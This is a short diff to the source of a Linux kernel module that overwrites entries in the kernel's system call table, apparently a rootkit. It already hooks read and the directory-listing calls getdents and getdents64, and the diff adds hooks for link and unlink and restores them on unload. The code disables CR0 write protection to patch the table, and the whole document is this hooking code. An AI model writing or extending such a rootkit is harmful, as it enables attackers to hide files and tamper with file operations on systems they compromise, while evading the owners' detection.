@@ -22,6 +22,10 @@ static int __init onload(void) {
         syscall_table[__NR_getdents64] = &new_getdents64;
         original_getdents = (void *)syscall_table[__NR_getdents];
         syscall_table[__NR_getdents] = &new_getdents;
+        original_link = (void *)syscall_table[__NR_link];
+        syscall_table[__NR_link] = &new_link;
+        original_unlink = (void *)syscall_table[__NR_unlink];
+        syscall_table[__NR_unlink] = &new_unlink;
         write_cr0 (read_cr0 () | 0x10000);
 
         printk(KERN_EMERG "[+] onload: sys_call_table hooked\n");
@@ -44,6 +48,8 @@ static void __exit onunload(void) {
         syscall_table[__NR_read] = original_read;
         syscall_table[__NR_getdents64] = original_getdents64;
         syscall_table[__NR_getdents] = original_getdents;
+        syscall_table[__NR_link] = original_link;
+        syscall_table[__NR_unlink] = original_unlink;
         write_cr0 (read_cr0 () | 0x10000);
         printk(KERN_EMERG "[+] onunload: sys_call_table unhooked\n");
     } else {
